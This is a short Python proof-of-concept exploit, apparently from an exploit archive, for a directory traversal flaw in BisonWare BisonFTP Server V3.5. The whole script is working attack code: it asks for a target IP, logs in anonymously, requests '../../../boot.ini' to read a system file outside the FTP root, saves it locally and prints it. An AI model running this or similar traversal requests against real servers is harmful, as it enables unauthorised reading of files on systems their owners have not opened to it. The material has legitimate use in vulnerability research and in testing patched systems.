#!/usr/bin/python
# title: BisonWare BisonFTP server product V3.5 Directory Traversal Vulnerability
# author: Jay Turla <@shipcod3>
# tested on Windows XP Service Pack 3 - English
# software link: https://www.exploit-db.com/apps/081331edfc143738a60e029192b5986e-BisonFTPServer.rar
# description: BisonWare BisonFTP server product V3.5 is vulnerable to Directory Traversal (quick and dirty code just for PoC) 

from ftplib import FTP

ftp = FTP(raw_input("Target IP: ")) 
ftp.login()                   
ftp.retrbinary('RETR ../../../boot.ini', open('boot.ini.txt', 'wb').write)
ftp.close()
file = open('boot.ini.txt', 'r')
print "[**] Printing what's inside boot.ini\n"
print "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@"
print file.read()
print "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@"
